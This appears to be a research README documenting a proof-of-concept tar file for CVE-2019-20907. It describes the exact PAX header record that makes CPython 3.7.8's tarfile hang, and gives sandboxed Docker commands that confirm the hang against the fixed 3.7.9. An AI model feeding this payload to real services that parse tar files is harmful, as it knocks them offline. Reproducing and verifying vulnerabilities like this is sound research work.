# Generated payloads

## CVE-2019-20907

`CVE-2019-20907.tar` is 1024 bytes: one global PAX header whose first record is
`0 a=b\n`. CPython 3.7.8 `tarfile._proc_pax` does not advance past a zero-length record,
so `tarfile.open` never returns; 3.7.9 raises `ReadError`.

Generate it (deterministic):

```bash
python samples/payloads/CVE-2019-20907.py
```

Local verification with the pinned research images uses a parent process with its own
timeout, exactly like the research probe:

```bash
docker run --rm --network none --read-only --tmpfs /tmp:rw,size=16m \
  --cap-drop ALL --security-opt no-new-privileges --memory 256m --pids-limit 64 \
  -v "$PWD/samples/payloads:/p:ro" python:3.7.8-alpine \
  python -c "import subprocess,sys; subprocess.run([sys.executable,'-c',\"import tarfile; tarfile.open('/p/CVE-2019-20907.tar')\"], timeout=3)"
# 3.7.8: TimeoutExpired; the child had to be killed
docker run --rm --network none --read-only --tmpfs /tmp:rw,size=16m \
  --cap-drop ALL --security-opt no-new-privileges --memory 256m --pids-limit 64 \
  -v "$PWD/samples/payloads:/p:ro" python:3.7.9-alpine \
  python -c "import tarfile; tarfile.open('/p/CVE-2019-20907.tar')"
# 3.7.9: tarfile.ReadError immediately
```

This is an input artifact, not a standalone remote exploit. A caller must feed it to an
application that parses tar files; a timeout, not a bare HTTP 200, is the only meaningful
DoS oracle.
